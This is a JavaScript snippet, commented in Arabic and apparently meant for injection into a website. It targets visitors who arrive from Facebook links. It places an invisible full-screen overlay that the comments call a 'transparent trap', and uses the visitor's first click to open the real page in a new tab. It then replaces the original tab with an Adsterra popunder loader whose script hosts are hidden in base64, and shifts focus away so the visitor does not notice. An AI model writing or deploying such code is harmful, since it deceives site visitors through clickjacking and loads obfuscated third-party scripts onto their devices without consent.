(function() {
    // 1. الفلترة: لا يعمل الكود إلا بوجود البراميتر fb_source
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has("fb_source")) return;

    function startTransformation() {
        if (window._transformed) return;
        window._transformed = true;

        // أ. فتح المحتوى الأصلي في تبويب جديد (ليستمر الزائر في القراءة)
        // نستخدم رابط الموقع بدون البراميتر لضمان عدم تكرار الكود في التبويب الجديد
        const cleanUrl = window.location.origin + window.location.pathname;
        const newTab = window.open(cleanUrl, '_blank');

        if (newTab) {
            // ب. تحويل التبويب "الحالي" فوراً إلى صفحة إعلانات Adsterra
            // نقوم بمسح الصفحة الحالية وحقن السكربت فيها مباشرة
            document.open();
            document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Redirecting...</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}</style>
                </head>
                <body>
                    <script type="text/javascript" data-cfasync="false">
                        (function(){
                            var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}
                        })();
                    <\/script>
                </body>
                </html>
            `);
            document.close();
            
            // ج. إعادة التركيز للتبويب الجديد (المحتوى الأصلي) لكي لا ينزعج الزائر
            newTab.focus();
        }
    }

    // 2. الفخ الشفاف (The Master Trigger)
    const overlay = document.createElement('div');
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
    document.body.appendChild(overlay);

    const trigger = () => {
        startTransformation();
        overlay.remove();
    };

    overlay.addEventListener('touchstart', trigger, { once: true, passive: true });
    overlay.addEventListener('click', trigger, { once: true });

})();
